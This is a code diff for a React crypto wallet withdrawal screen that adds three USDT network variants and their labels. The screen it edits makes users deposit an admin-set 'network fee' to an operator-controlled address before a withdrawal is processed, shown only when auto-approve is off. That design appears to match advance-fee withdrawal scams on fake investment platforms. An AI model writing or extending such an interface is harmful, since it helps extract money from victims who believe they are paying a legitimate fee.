@@ -48,10 +48,13 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   }
 
   const maxAmount = wallet[asset];
+
   const prices: Record<AssetType, number> = {
     btc: settings.btc_price,
     eth: settings.eth_price,
-    usdt: settings.usdt_price,
+    usdt_trc20: settings.usdt_price,
+    usdt_bep20: settings.usdt_price,
+    usdt_erc20: settings.usdt_price,
     trx: settings.trx_price,
   };
 
@@ -59,13 +62,21 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   const feeDepositAddress: string | null | undefined =
     settings[`deposit_address_${asset}` as keyof SettingsData] as string | null | undefined;
 
-  // Convert the USD gas fee to the withdrawal asset's units
-  const feeInAsset: number =
-    asset === 'usdt'
-      ? parseFloat(settings.gas_fee_usd.toFixed(4))
-      : parseFloat((settings.gas_fee_usd / prices[asset]).toFixed(8));
+  const isUsdt = asset === 'usdt_trc20' || asset === 'usdt_bep20' || asset === 'usdt_erc20';
 
-  const assetLabel = asset.toUpperCase();
+  // Convert the USD gas fee to the withdrawal asset's units
+  const feeInAsset: number = isUsdt
+    ? parseFloat(settings.gas_fee_usd.toFixed(4))
+    : parseFloat((settings.gas_fee_usd / prices[asset]).toFixed(8));
+
+  const assetLabel = (() => {
+    switch (asset) {
+      case 'usdt_trc20': return 'USDT (TRC20)';
+      case 'usdt_bep20': return 'USDT (BEP20)';
+      case 'usdt_erc20': return 'USDT (ERC20)';
+      default: return asset.toUpperCase();
+    }
+  })();
 
   // Gas fee section shows only when:
   //   1. auto-approve is OFF, AND
@@ -76,7 +87,9 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
     switch (asset) {
       case 'btc': return 'Bitcoin (BTC)';
       case 'eth': return 'Ethereum (ETH)';
-      case 'usdt': return 'Tether (USDT)';
+      case 'usdt_trc20': return 'Tether USDT (TRC20)';
+      case 'usdt_bep20': return 'Tether USDT (BEP20)';
+      case 'usdt_erc20': return 'Tether USDT (ERC20)';
       case 'trx': return 'Tron (TRX)';
     }
   };
@@ -182,7 +195,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
               placeholder="0.00"
               step="any"
             />
-            <div className="absolute right-4 top-1/2 -translate-y-1/2 text-muted font-medium">
+            <div className="absolute right-4 top-1/2 -translate-y-1/2 text-muted font-medium text-sm">
               {assetLabel}
             </div>
           </div>
@@ -196,10 +209,9 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
           </div>
         </div>
 
-        {/* Network Fee section — only shown when a deposit address is set for THIS coin and auto-approve is off */}
+        {/* Network Fee section */}
         {showGasFeeSection && (
           <div className="flex flex-col gap-4 p-4 rounded-xl border border-[#da3637]/30 bg-[#da3637]/10">
-            {/* Fee amount header */}
             <div className="flex gap-3">
               <AlertCircle className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
               <div className="flex flex-col gap-1">
@@ -209,12 +221,11 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
                   <span className="text-sm font-normal text-muted ml-2">≈ ${settings.gas_fee_usd.toFixed(2)}</span>
                 </div>
                 <div className="text-xs text-muted/90 leading-relaxed">
-                  Before your withdrawal is processed, deposit the network fee above to the {assetLabel} address below.
+                  Before your withdrawal is processed, deposit the network fee above to the address below.
                 </div>
               </div>
             </div>
 
-            {/* Asset-specific deposit address */}
             <div className="flex flex-col gap-2">
               <span className="text-xs text-muted uppercase tracking-widest font-medium">
                 Send fee to this {assetLabel} address
@@ -228,11 +239,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
               </button>
             </div>
 
-            {/* Acknowledgement checkbox — label wraps everything so the whole row is clickable */}
-            <label
-              htmlFor={checkboxId}
-              className="flex items-start gap-3 cursor-pointer select-none"
-            >
+            <label htmlFor={checkboxId} className="flex items-start gap-3 cursor-pointer select-none">
               <input
                 id={checkboxId}
                 type="checkbox"
@@ -247,7 +254,6 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
               </span>
             </label>
 
-            {/* Gas fee reminder — appears after checkbox is ticked and amount entered */}
             {showGasFeeWarning && (
               <div className="rounded-lg bg-destructive/20 border border-destructive/40 px-3 py-2.5 flex gap-2 items-start">
                 <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
